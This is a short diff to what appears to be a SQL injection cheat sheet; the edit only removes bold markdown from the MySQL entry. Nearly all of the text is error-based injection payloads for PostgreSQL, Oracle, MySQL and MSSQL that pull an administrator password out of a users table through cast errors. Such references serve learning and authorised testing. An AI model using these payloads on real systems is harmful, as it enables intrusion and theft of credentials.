@@ -252,7 +252,7 @@ TrackingId=xyz'||(SELECT password FROM users WHERE username='administrator')::in
 '||(SELECT CAST(password AS int) FROM users WHERE ROWNUM=1 AND username='administrator')||'
 
 ### MySQL
-**' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--**
+' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--
 
 ### MSSQL
 ' AND 1=CONVERT(int, (SELECT TOP 1 password FROM users))--
